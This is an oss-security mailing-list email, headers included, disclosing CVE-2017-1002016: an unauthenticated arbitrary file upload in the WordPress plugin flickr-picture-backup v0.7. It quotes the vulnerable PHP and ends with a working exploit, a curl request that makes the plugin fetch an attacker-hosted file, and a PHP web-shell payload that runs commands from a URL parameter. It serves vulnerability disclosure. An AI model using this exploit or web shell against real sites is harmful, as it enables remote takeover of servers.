X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1832" "Sunday" "30" "April" "2017" "12:45:47" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<968B1E14-0721-4973-8564-EEA02685D040@me.com>" "54" "[oss-security] Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7" nil nil nil "4" "2017043016:45:47" "[oss-security] Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7" (number mark "U       larry0@me.co Apr 30   54/1832  " thread-indent "\"[oss-security] Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9535 invoked by uid 550); 30 Apr 2017 16:46:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9511 invoked from network); 30 Apr 2017 16:46:02 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1493570750; bh=SAM/4AZU5OiUk8i6fVui2MXmcMdMOHVClVUS1AL/+EU=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=bMD/rWG+t2LVTRvk/9UtGNakwQt9exroU0BCCkVGS7W0o0f/jNVqV4jIpis+Nzac1
 TDa/bJXQ4EqJ672/WAZF2/gDCNsVpfuMMOebVoJZedw0j1nIgiUhuf+6bbBAYTiy97
 puRQl5Rtwi/wxOxwmFqTW9jvALDtIL76mHdEyMy4Y8xH66WRx/FM2SK0wuzrzZ3GJv
 LSXHEEh3iTAO2nlocFghcT+IJCO6ScakPCeU0RbykQlFLim1feSgHKn8DRVF/nRZmB
 8EckCQGa+7swrvd1pD9ESEgXd+vHO6j/S2ddcykpNQJ6n8CAsvUxA5HCEMjtiSqW9x
 GIGsA28NNrUsA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-04-30_11:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1704300136
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <968B1E14-0721-4973-8564-EEA02685D040@me.com>
Date: Sun, 30 Apr 2017 12:45:47 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Arbitrary file upload vulnerability in Wordpress plugin
 flickr-picture-backup v0.7

Title: Arbitrary file upload vulnerability in Wordpress plugin flickr-pictu=
re-backup v0.7
Author: Larry W. Cashdollar, @_larry0
Date: 2017-04-26
CVE-ID:[CVE-2017-1002016]
Download Site: https://wordpress.org/plugins/flickr-picture-backup/
Vendor: http://daozhao.goflytoday.com/
Vendor Notified: 2017-04-26
Vendor Contact:
Advisory: http://www.vapidlabs.com/advisory.php?v=3D190
Description: Backup flickr=E2=80=99s picture which in page/post External li=
nks to flickr=E2=80=99s picture.=20
Vulnerability:
The code in flickr-picture-download.php doesn't check to see if the user is=
 authenticated or that they have permission to upload files.  It also doesn=
't check what type of file is being uploaded.

define('WP_ADMIN', TRUE);
require_once('../../../wp-load.php');
require_once(ABSPATH . 'wp-admin/includes/admin.php');
//require_once("./flickr-picture-backup.php");
//echo "flickr-picture-download.php";
if($_GET["url"])
{
    $url =3D $_GET["url"];
    $fl =3D wp_daozhao_download_flickr_picture($url);
    if ( is_wp_error($fl) )
    {
		echo  "FALSE:" . $fl->get_error_message();
    }
    else
    {
        wp_daozhao_flickr_backupfile_exists($url,$returl);
        echo "OK:" . $returl ;
    }
    //echo wp_daozhao_flickr_backup_urlpath();
    //echo "OK";
}

Export: JSON TEXT XML
Exploit Code:
	=E2=80=A2 $ curl http://example.com/wp-content/plugins/flickr-picture-back=
up/flickr-picture-download.php -d "url=3Dhttp://myhost/shell.php"
	=E2=80=A2=20=20
	=E2=80=A2 Where shell.php is code to print out php web shell code, somethi=
ng like:
	=E2=80=A2=20=20
	=E2=80=A2 <?php
	=E2=80=A2 echo "<?php\n\$cmd=3D\$_GET['cmd'];\nsystem(\$cmd);\n?>\n";
	=E2=80=A2 ?>
	=E2=80=A2=20=20
	=E2=80=A2 Upon exploitation your shell is in:
	=E2=80=A2=20=20
	=E2=80=A2 http://example.com/wp-content/uploads/flickr_backup/shell.php=
